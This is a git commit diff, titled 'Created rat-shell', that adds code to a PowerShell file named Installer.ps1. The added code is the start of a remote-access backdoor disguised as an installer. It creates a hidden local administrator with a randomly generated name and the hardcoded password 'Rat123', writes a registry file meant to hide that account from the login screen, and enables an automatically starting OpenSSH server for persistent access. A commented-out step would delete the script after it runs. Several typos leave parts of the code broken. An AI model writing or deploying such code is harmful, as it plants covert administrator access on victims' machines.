d60dc6c1e153a7a45fa24f84ab78b10bd06c2cc3
lukeeeeeee335 <lukeeeeeee334@gmail.com>
2026-01-25 18:35:30 +0000

    Created rat-shell

--- files/Installer.ps1
+++ files/Installer.ps1
@@ -7,6 +7,35 @@ function random_text{
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 
 }
+# create's local admin
+function create_account {
+    [CmdletBidning()]
+    param (
+        [string] $uname,
+        [securestring] $pword
+    )
+    begin {
+    }
+    process {
+        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
+        Write-Verbose "$uname local user crated"
+        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+    }
+    end {
+    }
+}
+#create admin user
+$uname = random_text
+$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+create_account -uname $uname -pword $pword
+
+# registry to hide local admin
+$registry_name = random_text 
+(
+    echo Windows Registry Editor Version 5.00
+    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
+    echo "rat"=dword:00000000 ; ) > "$registry_name.reg"
+
 
 
 
@@ -16,16 +45,24 @@ function random_text{
 
 ## Variables
 $wd = random_text
+
+
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
-#goto temp and make working directory
 
+#enabling persistant ssh
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+Get-NetFirewallRule -Name *ssh*
+
+# 
+
+#goto temp and make working directory
 mkdir $path
 cd $path
 
-
-
 # self delete
-cd $initial_dir
-del Installer.ps1
+#cd $initial_dir
+#del Installer.ps1
